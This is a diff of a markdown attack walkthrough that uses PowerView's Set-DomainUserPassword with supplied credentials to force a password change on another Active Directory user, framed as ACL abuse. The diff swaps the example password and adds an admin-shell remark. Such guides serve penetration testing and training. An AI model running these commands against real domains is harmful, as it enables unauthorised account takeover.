@@ -12,7 +12,7 @@
      Replace `DOMAIN\USERNAME` (e.g., `corp.com\ali`).
 
 2. **Define the New Password for the Target User**  
-   - **Create a Secure String** for the new password (e.g., `Pwn3d_by_ACLs!`):  
+   - **Create a Secure String** for the new password (e.g., `P@ssword123`):  
      ```powershell
      $NewPassword = ConvertTo-SecureString '<NEW_PASSWORD>' -AsPlainText -Force
      ```  
@@ -23,7 +23,7 @@
      ```powershell
      Import-Module .\PowerView.ps1
      ```  
-   - **Execute the Password Change**:  
+   - **Execute the Password Change (Must be admin shell)**:  
      ```powershell
      Set-DomainUserPassword -Identity <TARGET_USER> -AccountPassword $NewPassword -Credential $Cred -Verbose
      ```  
